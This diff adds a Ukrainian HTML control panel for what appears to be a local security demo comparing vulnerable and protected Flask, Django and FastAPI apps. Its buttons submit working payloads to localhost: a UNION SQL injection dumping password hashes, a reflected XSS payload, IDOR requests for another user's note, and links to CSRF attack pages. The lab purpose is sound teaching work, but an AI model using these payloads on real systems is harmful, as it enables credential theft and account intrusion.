@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+<meta charset="utf-8">
+<title>Панель керування демонстрацією</title>
+<style>
+  :root {
+    --bg: #0f1117; --fg: #e8e8ea; --border: #2a2d38;
+    --v-accent: #e23e3e; --p-accent: #1f9d55;
+    --row-bg: #171a22; --row-bg-alt: #1b1e27;
+  }
+  body {
+    background: var(--bg); color: var(--fg);
+    font-family: "Segoe UI", system-ui, sans-serif;
+    max-width: 980px; margin: 0 auto; padding: 28px 20px;
+  }
+  h1 { font-size: 1.7rem; border-bottom: 2px solid var(--border); padding-bottom: 12px; }
+  h2 { color: #8ab4f8; margin-top: 36px; font-size: 1.25rem; }
+  p.note { color: #999; font-size: 0.88rem; line-height: 1.5; }
+
+  table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+  th {
+    text-align: left; font-size: 0.82rem; color: #999;
+    text-transform: uppercase; letter-spacing: 0.03em;
+    padding: 6px 10px; border-bottom: 1px solid var(--border);
+  }
+  td { padding: 8px 10px; vertical-align: middle; }
+  tr:nth-child(odd) td { background: var(--row-bg); }
+  tr:nth-child(even) td { background: var(--row-bg-alt); }
+  td:first-child { border-radius: 6px 0 0 6px; }
+  td:last-child { border-radius: 0 6px 6px 0; }
+
+  .framework-cell { font-weight: 600; width: 110px; }
+  .mode-badge {
+    display: inline-block; font-size: 0.78rem; font-weight: 700;
+    padding: 2px 8px; border-radius: 4px; width: 68px; text-align: center;
+  }
+  .mode-badge.v { background: rgba(226,62,62,0.15); color: var(--v-accent); }
+  .mode-badge.p { background: rgba(31,157,85,0.15); color: var(--p-accent); }
+
+  button {
+    background: #262a36; color: var(--fg); border: 1px solid #3a3f4e;
+    border-radius: 6px; padding: 7px 16px; cursor: pointer; font-size: 0.88rem;
+  }
+  button:hover { border-color: #8ab4f8; background: #2d3240; }
+
+  .section-links a {
+    color: #8ab4f8; display: block; margin: 4px 0; font-size: 0.9rem;
+  }
+</style>
+</head>
+<body>
+
+<h1>Демонстраційна панель</h1>
+<p class="note">
+  Кожна кнопка — звичайна HTML-форма (method=GET/POST, target="_blank"), без fetch/AJAX —
+  тому немає проблем із CORS чи SameSite, відповідь відкривається у новій вкладці.
+  Перед перевіркою IDOR спочатку натисніть «Увійти» для відповідної цілі.
+</p>
+
+<h2>1. Вхід (потрібно перед IDOR)</h2>
+<table>
+<thead><tr><th>Фреймворк</th><th>Режим</th><th></th></tr></thead>
+<tbody>
+<tr>
+  <td class="framework-cell">Flask</td>
+  <td><span class="mode-badge v">V</span></td>
+  <td><form method="POST" action="http://localhost:5001/login" target="_blank">
+    <input type="hidden" name="username" value="alice"><input type="hidden" name="password" value="alice123">
+    <button type="submit">Увійти</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Flask</td>
+  <td><span class="mode-badge p">P</span></td>
+  <td><form method="POST" action="http://localhost:5101/login" target="_blank">
+    <input type="hidden" name="username" value="alice"><input type="hidden" name="password" value="alice123">
+    <button type="submit">Увійти</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td>
+  <td><span class="mode-badge v">V</span></td>
+  <td><form method="POST" action="http://localhost:5002/login" target="_blank">
+    <input type="hidden" name="username" value="alice"><input type="hidden" name="password" value="alice123">
+    <button type="submit">Увійти</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td>
+  <td><span class="mode-badge p">P</span></td>
+  <td><form method="POST" action="http://localhost:5102/login" target="_blank">
+    <input type="hidden" name="username" value="alice"><input type="hidden" name="password" value="alice123">
+    <button type="submit">Увійти</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td>
+  <td><span class="mode-badge v">V</span></td>
+  <td><form method="POST" action="http://localhost:5003/login" target="_blank">
+    <input type="hidden" name="username" value="alice"><input type="hidden" name="password" value="alice123">
+    <button type="submit">Увійти</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td>
+  <td><span class="mode-badge p">P</span></td>
+  <td><form method="POST" action="http://localhost:5103/login" target="_blank">
+    <input type="hidden" name="username" value="alice"><input type="hidden" name="password" value="alice123">
+    <button type="submit">Увійти</button></form></td>
+</tr>
+</tbody>
+</table>
+
+<h2>2. SQL Injection (UNION, витік хешів паролів)</h2>
+<table>
+<thead><tr><th>Фреймворк</th><th>Режим</th><th></th></tr></thead>
+<tbody>
+<tr>
+  <td class="framework-cell">Flask</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5001/search" target="_blank">
+    <input type="hidden" name="q" value="zzz' UNION SELECT id, password_hash, email FROM users --">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Flask</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5101/search" target="_blank">
+    <input type="hidden" name="q" value="zzz' UNION SELECT id, password_hash, email FROM users --">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5002/search" target="_blank">
+    <input type="hidden" name="q" value="zzz' UNION SELECT id, password, email FROM auth_user --">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5102/search" target="_blank">
+    <input type="hidden" name="q" value="zzz' UNION SELECT id, password, email FROM auth_user --">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5003/search" target="_blank">
+    <input type="hidden" name="q" value="zzz' UNION SELECT id, password_hash, email FROM users --">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5103/search" target="_blank">
+    <input type="hidden" name="q" value="zzz' UNION SELECT id, password_hash, email FROM users --">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+</tbody>
+</table>
+
+<h2>3. Reflected XSS (через /greet — без БД, payload без лапок, не конфліктує з SQLi)</h2>
+<table>
+<thead><tr><th>Фреймворк</th><th>Режим</th><th></th></tr></thead>
+<tbody>
+<tr>
+  <td class="framework-cell">Flask</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5001/greet" target="_blank">
+    <input type="hidden" name="name" value="<img src=x onerror=alert(1)>">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Flask</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5101/greet" target="_blank">
+    <input type="hidden" name="name" value="<img src=x onerror=alert(1)>">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5002/greet" target="_blank">
+    <input type="hidden" name="name" value="<img src=x onerror=alert(1)>">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5102/greet" target="_blank">
+    <input type="hidden" name="name" value="<img src=x onerror=alert(1)>">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5003/greet" target="_blank">
+    <input type="hidden" name="name" value="<img src=x onerror=alert(1)>">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5103/greet" target="_blank">
+    <input type="hidden" name="name" value="<img src=x onerror=alert(1)>">
+    <button type="submit">Атакувати</button></form></td>
+</tr>
+</tbody>
+</table>
+
+<h2>4. IDOR (потрібен попередній «Вхід» для тієї самої цілі)</h2>
+<table>
+<thead><tr><th>Фреймворк</th><th>Режим</th><th></th></tr></thead>
+<tbody>
+<tr>
+  <td class="framework-cell">Flask</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5001/notes/3" target="_blank">
+    <button type="submit">Чужа нотатка</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Flask</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5101/notes/3" target="_blank">
+    <button type="submit">Чужа нотатка</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5002/notes/3" target="_blank">
+    <button type="submit">Чужа нотатка</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">Django</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5102/notes/3" target="_blank">
+    <button type="submit">Чужа нотатка</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td><td><span class="mode-badge v">V</span></td>
+  <td><form method="GET" action="http://localhost:5003/notes/3" target="_blank">
+    <button type="submit">Чужа нотатка</button></form></td>
+</tr>
+<tr>
+  <td class="framework-cell">FastAPI</td><td><span class="mode-badge p">P</span></td>
+  <td><form method="GET" action="http://localhost:5103/notes/3" target="_blank">
+    <button type="submit">Чужа нотатка</button></form></td>
+</tr>
+</tbody>
+</table>
+
+<h2>5. CSRF (окремий протокол, браузерний)</h2>
+<p class="note">
+  CSRF вимагає стороннього origin і не вписується в кнопкову панель так само просто —
+  використовуйте готові сторінки з attacks/csrf_site/ за протоколом із docs/criteria.md:
+</p>
+<div class="section-links">
+  <a href="http://127.0.0.1:8080/login_helper.html" target="_blank">1. login_helper.html — спершу увійти</a>
+  <a href="http://127.0.0.1:8080/evil-5001.html" target="_blank">2a. evil-5001.html — атака на Flask V</a>
+  <a href="http://127.0.0.1:8080/evil-5101.html" target="_blank">2b. evil-5101.html — атака на Flask P</a>
+  <a href="http://127.0.0.1:8080/evil-5102.html" target="_blank">2c. evil-5102.html — атака на Django P (403, Origin-перевірка)</a>
+</div>
+<p class="note">
+  Потрібен запущений локальний сервер: <code>python -m http.server 8080 --bind 127.0.0.1</code>
+  у папці attacks/csrf_site/.
+</p>
+
+</body>
+</html>
